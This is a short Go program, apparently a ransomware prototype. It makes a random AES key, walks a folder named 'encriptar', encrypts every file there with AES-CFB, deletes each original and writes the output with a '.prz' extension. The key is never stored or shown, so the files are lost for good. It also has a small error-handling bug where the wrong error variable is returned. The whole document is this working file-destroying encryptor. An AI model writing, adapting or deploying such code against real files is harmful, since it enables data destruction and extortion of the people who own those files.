package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
)

func generarLlave() []byte {
	var llave [32]byte
	_, err := rand.Read(llave[:])
	if err != nil {
		panic(err)
	}
	return llave[:]
}

func encrypt(fileName string, key []byte) error {
	file, err := os.Open(fileName)
	if err != nil {
		return err
	}
	defer file.Close()
	fileContents, err := ioutil.ReadAll(file)
	if err != nil {
		return err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	ciphertext := make([]byte, aes.BlockSize+len(fileContents))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return err
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], fileContents)
	errorr := os.Remove(fileName)
	if errorr != nil {
		return err
	}
	return ioutil.WriteFile(fileName+".prz", ciphertext, 0600)
}

func encryptFolder(folder string, key []byte) error {
	return filepath.Walk(folder, func(filePath string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			return encrypt(filePath, key)
		}
		return nil
	})
}
func main() {
	key := generarLlave()
	err := encryptFolder("./encriptar", key)
	if err != nil {
		fmt.Println("La carpeta no existe")
	}
}
